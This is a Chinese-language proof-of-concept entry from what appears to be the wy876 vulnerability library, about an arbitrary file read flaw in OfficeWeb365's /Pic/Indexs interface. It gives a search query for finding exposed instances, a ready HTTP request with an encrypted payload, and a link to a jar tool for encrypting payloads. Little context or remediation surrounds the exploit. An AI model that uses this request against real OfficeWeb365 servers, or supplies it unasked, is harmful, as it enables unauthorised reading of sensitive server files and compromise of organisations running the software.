---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# OfficeWeb365 Pic存在任意读取漏洞

# 一、漏洞简介
OfficeWeb365是西安大西信息科技有限公司开发的，专注于Office文档在线预览及PDF文档在线预览云服务，包括Microsoft Word文档在线预览、Excel表格在线预览、Powerpoint演示文档在线预览，WPS文字处理、WPS表格、WPS演示及Adobe PDF文档在线预览。广泛应用于OA办公系统、招聘网站、在线教育类网站，提高客户体验、增加产品竞争力。OfficeWeb365 /Pic/Indexs接口处存在任意文件读取漏洞，攻击者可通过独特的加密方式对payload进行加密，读取任意文件，获取服务器敏感信息，使系统处于极不安全的状态。

# 二、影响版本
+ OfficeWeb365

# 三、资产测绘
+ hunter：`app.name="OfficeWeb365"`


+ 登录页面


# 四、漏洞复现
```http
GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


[Mosaic-crypt-tools-1.5-SNAPSHOT-jar-with-dependencies.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222151369-ef2358bd-08df-4e87-92ee-c1b130128665.jar)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ot9mxhmqtud1katb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
